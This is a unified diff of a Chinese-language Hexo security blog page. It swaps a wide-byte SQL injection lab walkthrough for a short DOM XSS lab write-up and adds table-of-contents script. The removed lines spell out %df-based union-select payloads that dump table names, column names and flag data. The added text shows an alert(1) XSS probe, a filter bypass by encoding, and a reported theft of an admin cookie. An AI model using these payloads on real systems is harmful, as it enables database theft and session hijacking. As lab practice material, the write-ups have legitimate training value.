@@ -7,7 +7,7 @@
 
 
 
-<title>宽字节注入 | Hexo</title>
+<title>DOM型XSS | Hexo</title>
 
 
 
@@ -103,11 +103,73 @@
             <div class="container">
     
     
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
 
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">宽字节注入</h1>
+            <h1 class="post-title">DOM型XSS</h1>
             
                 <div class="post-meta">
                     
@@ -116,7 +178,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">October 18, 2019&nbsp;&nbsp;19:59:24</a>
+                        Date: <a href="#">October 20, 2019&nbsp;&nbsp;19:27:07</a>
                         </span>
                     
                     
@@ -125,37 +187,18 @@
         </header>
 
         <div class="post-content">
-            <p><strong>宽字节注入的原理：</strong>因为一些网站数据库是GBK编码，引入了魔术引号开关，当有特殊符号时会增加转义字符“\”，宽字节注入就是用%df吃掉”&quot;，%df和”&quot;可以在GBK编码中组成一个’運’字，所以就避免了被转义。</p>
-<p>内容有点简单所以直接上靶场</p>
-<p><strong>1.利用and1=1 显示正常， and 1=2 显示错误页面。</strong></p>
-<p>证明有注入点,但是有趣的来了,当我们构造payload的时候    发现莫名其妙的多了一个”&quot;</p>
-<p><img src="https://s2.ax1x.com/2019/10/18/KeVJT1.png" alt="KeVJT1.png"></p>
-<p>说明我们的闭合没有起作用   因为被”&quot;转意</p>
-<p>宽字节注入就是为了吃掉这个”&quot;转义符</p>
-<p><img src="https://s2.ax1x.com/2019/10/18/KeZMNt.png" alt="KeZMNt.png"></p>
-<p>所以我们的 and 1=2 没有起到报错作用</p>
-<p>我们不知道内部的情况，试一下怎么加%df</p>
-<p>语句是</p>
-<pre><code>%df’and 1=2 --+</code></pre><p><img src="https://s2.ax1x.com/2019/10/18/KeZRER.png" alt="KeZRER.png"></p>
-<p>OK 报错 说明我们的<code>%df&#39;</code>起到作用闭合了前面的’</p>
-<p>说明存在宽字节注入</p>
-<p><strong>2.order by 语句查询有几个字段</strong></p>
-<p>order by 3 显示正确，判断为3个字段</p>
-<p><img src="https://s2.ax1x.com/2019/10/18/KeZx8f.png" alt="KeZx8f.png"></p>
-<p><strong>3.使用union 联合查询 显错点，输出点</strong></p>
-<pre><code>语句： ?id=1%df&apos; and 1=2 union select 1,2,3 --+</code></pre><p><img src="https://s2.ax1x.com/2019/10/18/KemFyD.png" alt="KemFyD.png"></p>
-<p>显错点为2,3</p>
-<p><strong>4.查询当前库名</strong></p>
-<pre><code>语句：%df’and 1=2 union select 1,database(),3 --+</code></pre><p><img src="https://s2.ax1x.com/2019/10/18/KemwlT.png" alt="KemwlT.png"></p>
-<p><strong>5.查表名，利用当前库名查系统表</strong><br>语句：</p>
-<pre><code>?id=1%df&apos; and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479--+</code></pre><p><img src="https://s2.ax1x.com/2019/10/18/KenI2V.png" alt="KenI2V.png"></p>
-<p>这里利用到了一个16进制转换，意思是字符串转换成数据库认识的16进制，<br>否则也会被魔术引号转义。这里试将库名转换成16进制，前面再加上0x</p>
-<p><strong>6.查字段名，利用表名查系统表，查该表下有哪些字段</strong></p>
-<p>语句：  </p>
-<pre><code>?id=1%df&apos; and 1=2 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=0x7a6b6171--+</code></pre><p><img src="https://s2.ax1x.com/2019/10/18/Keumxf.png" alt="Keumxf.png"></p>
-<p>7.查表内的信息<br>语句：</p>
-<pre><code>?id=1%df&apos; and 1=2 union select 1,group_concat(flag),group_concat(zKaQ) from zkaq --+</code></pre><p>我们想要的表内的所有信息如图全部展示</p>
-<p><img src="https://s2.ax1x.com/2019/10/18/KeuJGq.png" alt="KeuJGq.png"></p>
+            <p>使用DOM可以允许程序和脚本动态地访问和更新文档的内容，结构和样式</p>
+<h2 id="直接上靶场"><a href="#直接上靶场" class="headerlink" title="直接上靶场"></a>直接上靶场</h2><p><img src="https://s2.ax1x.com/2019/10/20/KMluMd.png" alt="KMluMd.png"></p>
+<p>先<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 试一下</p>
+<p><img src="https://s2.ax1x.com/2019/10/20/KMlGi8.png" alt="KMlGi8.png"></p>
+<p>好像有一个防火墙的东西  </p>
+<p>那我们就想办法绕过</p>
+<p>转一下Native编码 </p>
+<p><img src="https://s2.ax1x.com/2019/10/20/KMlcz4.png" alt="KMlcz4.png"></p>
+<p>成功弹窗</p>
+<p>于是，到XSS平台中获取payload如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/6936994-cdb42fa6f42f73c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt></p>
+<p>最终看到XSS平台已经接收到管理员的Cookie和flag</p>
 
         </div>
 
@@ -170,7 +213,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://yoursite.com/2019/10/18/宽字节注入/">http://yoursite.com/2019/10/18/宽字节注入/</a></span>
+                        <span><a href="http://yoursite.com/2019/10/20/DOMXSS/">http://yoursite.com/2019/10/20/DOMXSS/</a></span>
                     </p>
                 
                 
@@ -203,10 +246,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2019/10/20/Accsess注入 — 偏移注入/">Accsess注入 — 偏移注入</a>
             
-            
-            <a class="next" rel="next" href="/2019/10/18/盲注/">SQL注入之盲注</a>
+            <a class="next" rel="next" href="/2019/10/20/存储型XSS/">XSS靶场演练—FineCMS v5.3.0 存储型XSS漏洞的利用</a>
             
         </section>
 
